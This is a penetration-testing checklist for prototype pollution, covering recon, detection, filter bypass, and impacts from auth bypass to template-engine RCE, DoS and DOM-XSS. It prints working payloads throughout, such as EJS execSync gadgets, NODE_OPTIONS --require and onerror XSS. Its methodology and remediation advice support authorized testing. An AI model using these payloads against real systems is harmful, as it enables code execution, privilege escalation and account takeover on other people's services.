# Prototype Pollution — Checklist

Expert per-attack **test-case matrix** for Prototype Pollution — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*13 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## PP-001 — Identify environment, sources, vectors &amp; libs
**Test Category:** Recon &amp; Source · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Node server-side / browser client-side / both

**Test Steps:** 1. Decide the environment: Node server-side, browser client-side, or both.<br>2. Find candidate SOURCES (merge/extend/set/clone/query-parse) via JS review or behavior.<br>3. Map input vectors: JSON body, query string, form, hash, path/headers.<br>4. Enumerate loaded libraries + versions (lodash/jQuery/minimist/EJS/Pug) for known-CVE gadgets.

**Expected Result:** The env, recursive-merge sources, vectors, and library gadget candidates are known.

**Payload Example:**

```
sources: lodash.merge, Object.assign, qs ; libs: EJS 3.1, jQuery 3.4 ; vectors: JSON body + ?query
```

**Impact:** Without a source AND a matching gadget there is no impact - both must be located first.

**Tools:** DOM Invader, Burp, source review

**References:** CWE-1321; OWASP: Prototype Pollution

---

## PP-002 — Client-side — prove GLOBAL pollution
**Test Category:** Detection · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** URL / hash / JSON reaching a client-side merge

**Test Steps:** 1. ?__proto__[polluted]=yes (and ?__proto__.polluted=yes, #__proto__[polluted]=yes).<br>2. In console: Object.prototype.polluted==='yes' AND a FRESH object carries it: ({}).polluted.<br>3. Confirm it's global pollution, not mere reflection.

**Expected Result:** A brand-new empty object inherits the polluted property (global pollution).

**Payload Example:**

```
?__proto__[polluted]=yes -> Object.prototype.polluted ; ({}).polluted === 'yes'
```

**Impact:** Global client-side pollution - the prerequisite for a DOM-XSS gadget. Primitive.

**Tools:** DOM Invader, browser console

**References:** CWE-1321; PortSwigger Web Security Academy: Prototype pollution (+ server-side PP gadget list)

---

## PP-003 — Server-side (SSPP) — oracle detection (diff after)
**Test Category:** Detection · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** JSON/query source hitting a server-side merge

**Test Steps:** 1. Baseline a JSON endpoint (indentation/status/headers).<br>2. POST {"__proto__":{"json spaces":10}} -&gt; later JSON responses indent by 10 (BEST Express oracle).<br>3. Alt oracles: status 510, exposedHeaders, content-type charset, parameterLimit. Re-request and DIFF vs baseline; confirm REPEATABLE.

**Expected Result:** A benign property injected via __proto__ changes later responses globally.

**Payload Example:**

```
{"__proto__":{"json spaces":10}} then re-fetch -> JSON now indented ; {"__proto__":{"status":510}}
```

**Impact:** Confirmed server-side prototype pollution (global, persists until restart) - the SSPP primitive.

**Tools:** poc/pp_probe.py, Burp Repeater

**References:** CWE-1321; PortSwigger Web Security Academy: Prototype pollution (+ server-side PP gadget list)

---

## PP-004 — Filter bypass (constructor.prototype &amp; encodings)
**Test Category:** Evade — Filter · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Sources that block the __proto__ key

**Test Steps:** 1. constructor[prototype][x]=y bypasses __proto__ key filters.<br>2. __proto__[__proto__][x]=y ; strip-once naive filters: __pro__proto__to__ -&gt; __proto__.<br>3. URL-encode: %5f%5fproto%5f%5f ; duplicate/unicode JSON keys per parser.

**Expected Result:** Pollution succeeds via an alternate root despite the __proto__ block.

**Payload Example:**

```
?constructor[prototype][polluted]=yes ; {"constructor":{"prototype":{"x":"y"}}}
```

**Impact:** Restores pollution against key-blacklists - proves the filter is not a fix.

**Tools:** Burp, poc/pp_payloads.py

**References:** CWE-1321; HackTricks: Prototype Pollution

---

## PP-005 — Auth / logic bypass (gadget-free)
**Test Category:** Server-Side Impact · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Confirmed SSPP + app that reads inherited props for authz

**Test Steps:** 1. {"__proto__":{"isAdmin":true}} / {"role":"admin"} / {"isAuthenticated":true}.<br>2. constructor.prototype variant if __proto__ blocked.<br>3. Confirm a privilege/state change against YOUR own session (aware it may transiently affect others - prefer a lab).

**Expected Result:** An inherited property flips an authorization/logic decision.

**Payload Example:**

```
{"__proto__":{"isAdmin":true}} ; {"constructor":{"prototype":{"role":"admin"}}}
```

**Impact:** Privilege escalation / auth bypass with no gadget - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-1321; CWE-287; HackTricks: Prototype Pollution

---

## PP-006 — Server-side RCE — child_process gadget (NODE_OPTIONS)
**Test Category:** Server-Side Impact · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed SSPP + a spawn/exec/fork whose options fall through to the prototype

**Test Steps:** 1. Pollute NODE_OPTIONS: {"__proto__":{"NODE_OPTIONS":"--require=/tmp/evil.js"}} (pair with FileUpload / /proc to land the file).<br>2. shell/argv0/env fall-through variants.<br>3. Confirm with ONE benign command / OOB callback, then STOP.

**Expected Result:** A subsequent child_process call inherits your option and executes code.

**Payload Example:**

```
{"__proto__":{"NODE_OPTIONS":"--require=/tmp/evil.js"}} ; {"__proto__":{"shell":"node","argv0":"...execSync('id')//"}}
```

**Impact:** Remote code execution via prototype-polluted process options - Critical.

**Tools:** interactsh, FileUpload kit

**References:** CWE-1321; CWE-94; PortSwigger Web Security Academy: Prototype pollution (+ server-side PP gadget list)

---

## PP-007 — Server-side RCE — template-engine gadget (EJS / Pug)
**Test Category:** Server-Side Impact · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed SSPP + a server-rendered EJS/Pug/Handlebars template

**Test Steps:** 1. EJS: {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}.<br>2. Pug: {"__proto__":{"compileDebug":true,"self":true,"line":"...execSync('id')"}}.<br>3. Match the gadget to the target's engine; benign command only.

**Expected Result:** The polluted template-compile option executes your benign command.

**Payload Example:**

```
{"__proto__":{"outputFunctionName":"x;...execSync('id');//"}} (EJS)
```

**Impact:** RCE via template-engine compile-option gadget - Critical.

**Tools:** interactsh, Burp

**References:** CWE-1321; CWE-94; PortSwigger Web Security Academy: Prototype pollution (+ server-side PP gadget list)

---

## PP-008 — Property-injection impact (no gadget) — CORS / redirect / cache
**Test Category:** Server-Side Impact · **Severity:** Medium · **CVSS:** 6.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Where to Test / Injection Point:** Confirmed SSPP affecting framework config

**Test Steps:** 1. Pollute exposedHeaders (CORS), a redirect target, or a cache/charset property.<br>2. e.g. {"__proto__":{"exposedHeaders":["x8bit"]}} -&gt; Access-Control-Expose-Headers.<br>3. Demonstrate the injected response behavior.

**Expected Result:** A polluted property changes CORS/redirect/cache behavior of responses.

**Payload Example:**

```
{"__proto__":{"exposedHeaders":["x8bit"]}} ; {"__proto__":{"content-type":"text/html; charset=x8bit"}}
```

**Impact:** Response manipulation (CORS relax / redirect / cache) without a gadget - Medium/High.

**Tools:** Burp Repeater

**References:** CWE-1321; HackTricks: Prototype Pollution

---

## PP-009 — Denial-of-service via prototype pollution
**Test Category:** Server-Side Impact · **Severity:** Medium · **CVSS:** 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Where to Test / Injection Point:** Confirmed SSPP where a polluted property breaks core request handling

**Test Steps:** 1. Pollute a property the framework reads on every request so it throws/hangs: e.g. an unexpected type that crashes JSON parsing / routing / a header handler.<br>2. One crafted pollution can 500 all subsequent requests until app RESTART (pollution persists).<br>3. AUTHORIZE first; prove the one-request-&gt;global-failure effect on a scratch/own instance, do NOT sustain a prod outage.

**Expected Result:** A single polluted property causes ongoing request failures until restart.

**Payload Example:**

```
{"__proto__":{"<framework-read-prop>":<crashing-value>}} -> subsequent requests 500
```

**Impact:** Persistent DoS from one request (survives until restart) - Medium/High (scope required).

**Tools:** Burp Repeater

**References:** CWE-1321; CWE-400; HackTricks: Prototype Pollution

---

## PP-010 — Client-side DOM-XSS gadget
**Test Category:** Client-Side Impact · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Confirmed client pollution + a library reading a config prop into a sink

**Test Steps:** 1. Pollute a prop a library reads into a sink: ?__proto__[src]=data:,alert(document.domain) ; [html]=&lt;img src=x onerror=alert(document.domain)&gt; ; [srcdoc] ; [url]=javascript:...<br>2. Known-gadget libs: jQuery ($.extend/htmlPrefilter/$(html)), GA/gtag, Segment, DOMPurify config.<br>3. Fire alert(document.domain); make it deliverable via URL to a victim (NOT self-only hash).

**Expected Result:** The polluted config property reaches a DOM sink and executes attacker JS.

**Payload Example:**

```
?__proto__[html]=<img src=x onerror=alert(document.domain)> ; ?__proto__[src]=data:,alert(document.domain)
```

**Impact:** DOM-XSS deliverable via URL -&gt; session/account theft - High (NOT self-XSS).

**Tools:** DOM Invader, ppfuzz

**References:** CWE-1321; CWE-79; PortSwigger Web Security Academy: Prototype pollution (+ server-side PP gadget list)

---

## PP-011 — Chain prototype pollution to fuller impact
**Test Category:** Escalate — Chains · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed pollution + a second sink

**Test Steps:** 1. FileUpload to land the --require file for NODE_OPTIONS RCE.<br>2. CORS/redirect property injection -&gt; data theft / open redirect.<br>3. Client DOM-XSS -&gt; account takeover.<br>4. Note reach: whole process (server) / all users (client) and that server pollution persists until restart.

**Expected Result:** Pollution combines with another primitive for RCE / ATO / data theft.

**Payload Example:**

```
SSPP NODE_OPTIONS + uploaded evil.js -> RCE ; client PP gadget -> XSS -> ATO
```

**Impact:** Compound Critical: RCE / mass DOM-XSS / cross-user impact from one pollution flaw.

**Tools:** FileUpload kit, DOM Invader

**References:** CWE-1321; HackTricks: Prototype Pollution

---

## PP-012 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: __proto__ merely reflected (not global); ?__proto__[x]=y returning 200 with no proven global effect; Object.prototype.x set but NO gadget/impact (primitive only - keep hunting); an SSPP oracle that blipped once (not repeatable); 'library X has a known gadget' but the sink never fires here; location.hash pollution affecting only your own tab (self-XSS).<br>2. REQUIRE: proven global pollution AND a fired gadget/impact.

**Expected Result:** Only candidates with global pollution AND a working gadget/impact survive.

**Payload Example:**

```
reflected __proto__ = not global ; primitive-only = keep hunting ; self-hash-XSS = not deliverable
```

**Impact:** Protects credibility; PP is dense with primitive-only / reflection false positives.

**Tools:** manual

**References:** CWE-1321; PortSwigger Web Security Academy: Prototype pollution (+ server-side PP gadget list)

---

## PP-013 — Client-facing impact &amp; SAFE-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact: RCE / DOM-XSS / privilege escalation / injected response, and the reach (whole process / all users).<br>2. Provide the source payload, the global-pollution proof (fresh object / oracle flip), and the gadget firing (benign command / alert).<br>3. Set CVSS 3.1 + CWE-1321 (cite the dependency CVE if applicable). Remediation: Object.freeze(Object.prototype), null-prototype objects, reject __proto__/constructor/prototype keys in merges, use Map, patched library versions, schema validation.<br>4. Benign markers, no app-breaking prop on prod, one RCE proof then STOP, flag that server pollution persists until restart, deliver client PoC to your own victim; de-dupe.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: source payload + global-pollution proof + gadget firing + reach + CVSS + CWE-1321 + remediation.
```

**Impact:** Converts source+gadget into a defensible Critical/High report at the right severity.

**Tools:** CVSS calculator, PROTOTYPE_POLLUTION_REPORT_TEMPLATE.md

**References:** CWE-1321; FIRST CVSS v3.1; OWASP: Prototype Pollution  |  TOP REFERENCES: Olivier Arteau 'Prototype pollution' (NorthSec); Gareth Heyes / PortSwigger server-side PP research; PayloadsAllTheThings; HackTricks; BlackHat

---
